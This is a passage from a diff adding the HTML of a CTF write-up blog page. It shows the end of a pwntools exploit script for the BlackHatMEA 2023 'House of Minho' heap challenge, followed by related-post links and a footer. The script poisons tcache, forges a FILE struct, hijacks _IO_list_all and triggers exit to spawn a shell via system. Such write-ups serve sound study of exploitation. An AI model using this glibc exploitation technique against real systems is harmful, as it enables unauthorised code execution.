+    <span class="n">do_alloc_off</span> <span class="o">=</span> <span class="mh">0x68</span>
+    <span class="n">_IO_list_all</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a680</span>
+    <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x50d60</span>
+
+    <span class="c1"># we can't hijack data in standard FILE struct directly because we have only *one* 0x80 bytes arbitrary write
+</span>    <span class="c1"># so we have to fake a FILE struct on heap and hijack the _IO_list_all pointer to it
+</span>
+    <span class="c1"># heap_base + 0x2d0 is the chunk_0x80(content), heap_base + 0x2c0 is the chunk_0x40(content)
+</span>    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">((</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2d0</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">heap_base</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)))</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">flat</span><span class="p">({</span>
+        <span class="mh">0x10</span><span class="p">:</span> <span class="sa">b</span><span class="s">"  sh;"</span><span class="p">,</span> <span class="c1"># fake FILE struct starts at heap_base + 0x2e0
+</span>        <span class="mh">0x38</span><span class="p">:</span> <span class="n">system</span><span class="p">,</span>
+        <span class="mh">0x68</span><span class="p">:</span> <span class="mh">0x71</span><span class="p">,</span>
+        <span class="mh">0x70</span><span class="p">:</span> <span class="n">_IO_list_all</span> <span class="o">^</span> <span class="p">(</span><span class="n">heap_base</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">),</span>
+    <span class="p">},</span> <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">))</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">flat</span><span class="p">({</span> <span class="c1"># starts from heap_base + 0x2e0 + 0x60
+</span>        <span class="n">wide_data_off</span><span class="o">-</span><span class="mh">0x60</span><span class="p">:</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2e0</span> <span class="o">+</span> <span class="mh">0xd0</span> <span class="o">-</span> <span class="n">wide_data_vtable_off</span><span class="p">,</span>
+        <span class="mh">0xd0</span><span class="o">-</span><span class="mh">0x60</span><span class="p">:</span>          <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2e0</span> <span class="o">+</span> <span class="mh">0x28</span> <span class="o">-</span> <span class="n">do_alloc_off</span><span class="p">,</span>
+        <span class="n">vtable_off</span><span class="o">-</span><span class="mh">0x60</span><span class="p">:</span>    <span class="n">_IO_wfile_overflow_ptr</span> <span class="o">-</span> <span class="n">__overflow_off</span><span class="p">,</span>
+    <span class="p">},</span> <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2e0</span><span class="p">))</span>   <span class="c1"># hijack _IO_list_all
+</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'4'</span><span class="p">)</span> <span class="c1"># trigger exit -&gt; ... -&gt; _IO_flush_all_lockp -&gt;_IO_overflow
+</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="c1"># ------------------ Infrastructure ------------------ #
+</span>
+<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+    <span class="n">g</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s">"""
+        source ~/gaio/load_sym.py
+        loadsym ~/gaio/libs/2.35-0ubuntu3_amd64/.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug
+    """</span><span class="p">)</span>
+    <span class="c1"># pause()
+</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"d"</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+        <span class="n">debug</span><span class="p">()</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"r"</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Usage: ./exp.py [d | r]"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">d for debug"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">r for remote"</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">()</span>
+
+    <span class="n">pwn</span><span class="p">()</span>
+</code></pre></div></div>
+
+  </div>
+    
+      <b>本博客上与 pwn 相关的贴子：</b>
+      <ul>
+        
+        
+          <li><a href="/2024/07/24/CISCN-Final-2024.html">CISCN Final 2024</a></li>
+        
+          <li><a href="/2024/04/18/BlackHatMEA2023-House-of-Minho.html">BlackHatMEA 2023 House of Minho</a></li>
+        
+          <li><a href="/2024/02/19/VNCTF2024-escape-langlang-mountain2.html">VNCTF 2024 escape_langlang_mountain2</a></li>
+        
+          <li><a href="/2023/11/29/HITCTF2023-xv6-Trusted.html">HITCTF 2023 xv6-Trusted</a></li>
+        
+          <li><a href="/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html">TAMUctf 2023 Pwnme - linked ROP chain</a></li>
+        
+          <li><a href="/2023/04/04/Bing-Chilling.html">UTCTF 2023 Bing Chilling</a></li>
+        
+      </ul>
+    
+  
+    
+      <b>本博客上与 heap 相关的贴子：</b>
+      <ul>
+        
+        
+          <li><a href="/2024/04/18/BlackHatMEA2023-House-of-Minho.html">BlackHatMEA 2023 House of Minho</a></li>
+        
+      </ul>
+    
+  
+
+  <div id="comments"></div>
+  <script>
+  new Valine({
+    el: "#comments",
+    app_id: "Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz",
+    app_key: "6VqGye1352LX381YQDTOaiXs",
+    placeholder: "El Psy Congroo",
+  });
+</script>
+
+
+  <a class="u-url" href="/2024/04/18/BlackHatMEA2023-House-of-Minho.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Y² 的博客</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Y² 的博客</li><li><a class="u-email" href="mailto:cameudis@gmail.com">cameudis@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cameudis</span></a></li><li><a href="https://www.twitter.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cameudis</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>料峭春风吹酒醒，微冷，山头斜照却相迎。回首向来萧瑟处，归去，也无风雨也无晴。</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
